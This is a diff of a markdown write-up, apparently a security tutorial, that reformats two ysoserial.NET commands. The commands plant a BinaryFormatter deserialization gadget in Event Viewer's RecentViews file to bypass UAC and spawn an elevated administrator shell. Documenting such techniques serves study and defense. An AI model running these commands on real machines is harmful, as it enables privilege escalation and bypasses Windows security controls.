@@ -100,7 +100,8 @@ If i were to open `taskmgr`, we can see UAC intefering with us.
 Now let's use `ysoserial .NET` to create our `Deserialization gadget`. 
 
 ```sh
-ysoserial.exe -o raw -g DataSet -f BinaryFormatter -c taskmgr > "C:\Users\wirel\AppData\Local\Microsoft\Event Viewer\RecentViews"
+ysoserial.exe -o raw -g DataSet -f BinaryFormatter -c taskmgr > 
+"C:\Users\wirel\AppData\Local\Microsoft\Event Viewer\RecentViews"
 ```
 Now when we open up EventViewer, it will be succum to insecure deserialization and open our task manager, bypassing UAC. This technique can also be used to bypass Applocker.
 
@@ -109,7 +110,9 @@ Now when we open up EventViewer, it will be succum to insecure deserialization a
 If this was an Admin account, attackers can easily spawn an elevated Administrator shell.
 
 ```sh
-ysoserial.exe --output=raw --gadget=DataSet --formatter=BinaryFormatter --command=powershell "start cmd -v runAs" --rawcmd > "C:\Users\wirel\AppData\Local\Microsoft\Event Viewer\RecentViews"
+ysoserial.exe --output=raw --gadget=DataSet --formatter=BinaryFormatter 
+--command=powershell "start cmd -v runAs" --rawcmd > 
+"C:\Users\wirel\AppData\Local\Microsoft\Event Viewer\RecentViews"
 ```
 
 
